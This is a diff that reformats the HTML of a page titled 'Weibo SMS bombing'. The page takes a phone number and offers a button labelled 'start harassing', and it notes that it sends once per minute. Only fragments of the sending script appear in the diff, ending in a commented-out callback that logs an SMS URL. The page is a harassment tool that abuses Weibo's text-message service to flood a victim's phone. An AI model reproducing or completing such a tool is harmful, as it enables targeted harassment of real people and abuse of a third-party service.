@@ -1,5 +1,14 @@
-<!DOCTYPE html><html><head>    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />    <title>微博短信轰炸</title><script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
-</head><body>注:每隔1分钟发送一次<br><h3 id='time'></h3>电话号码:<input type='text' id='num'><button type='button' onclick='f()'>开始骚扰</button><script>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>微博短信轰炸</title>
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+</head>
+<body>
+注:每隔1分钟发送一次<br><h3 id='time'></h3>
+电话号码:<input type='text' id='num'><button type='button' onclick='f()'>开始骚扰</button>
+<script>
 function f(){
     var phone_number=$("#num").val();
     
@@ -46,4 +55,6 @@ function(result){
     console.log(result.smsurl);
 });
 */
-</script></body></html>
+</script>
+</body>
+</html>
